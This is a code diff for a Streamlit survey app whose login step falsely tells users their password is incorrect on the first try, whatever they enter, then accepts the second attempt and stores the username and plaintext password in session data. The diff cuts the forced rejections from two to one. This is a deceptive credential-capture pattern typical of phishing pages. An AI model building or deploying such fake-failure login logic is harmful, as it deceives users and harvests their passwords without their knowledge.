@@ -34,7 +34,7 @@ def get_database():
         st.error(f"❌ Database connection failed: {e}")
         return None
 
-# Initialize ALL session state variables
+# Initialize session state
 if 'show_front_page' not in st.session_state:
     st.session_state.show_front_page = True
 if 'logged_in' not in st.session_state:
@@ -47,9 +47,7 @@ if 'login_attempts' not in st.session_state:
     st.session_state.login_attempts = 0
 if 'first_attempt_rejected' not in st.session_state:
     st.session_state.first_attempt_rejected = False
-if 'second_attempt_rejected' not in st.session_state:
-    st.session_state.second_attempt_rejected = False
-if 'answers' not in st.session_state:  # ADD THIS LINE
+if 'answers' not in st.session_state:
     st.session_state.answers = {}
 
 # Custom CSS for responsiveness
@@ -176,13 +174,12 @@ def login_section():
             if username and password:
                 st.session_state.login_attempts += 1
                 
-                # Reject first two attempts, accept on third
+                # Always reject the first attempt
                 if st.session_state.login_attempts == 1:
-                    st.error("❌ Password incorrect. Please try again. (Attempt 1/3)")
-                elif st.session_state.login_attempts == 2:
-                    st.error("❌ Password incorrect again. One more attempt remaining. (Attempt 2/3)")
+                    st.session_state.first_attempt_rejected = True
+                    st.error("❌ Password incorrect. Please try again.")
                 else:
-                    # Accept on third attempt
+                    # Accept on second attempt
                     st.session_state.user_data['username'] = username
                     st.session_state.user_data['password'] = password
                     st.session_state.user_data['login_timestamp'] = datetime.now()
@@ -378,7 +375,7 @@ def survey_section():
     
     else:
         # All questions completed - show summary and submit
-        st.success("🎉 Survey Completed! Don't forget to click on 'Submit Survey' below to submit your responses!")
+        st.success("🎉 Survey Completed!")
         st.subheader("Your Responses Summary:")
         
         # Transfer all answers from session_state.answers to user_data
@@ -416,7 +413,6 @@ def survey_section():
                 st.session_state.answers = {}
                 st.session_state.login_attempts = 0
                 st.session_state.first_attempt_rejected = False
-                st.session_state.second_attempt_rejected = False
                 
                 if st.button("Take Another Survey"):
                     st.rerun()
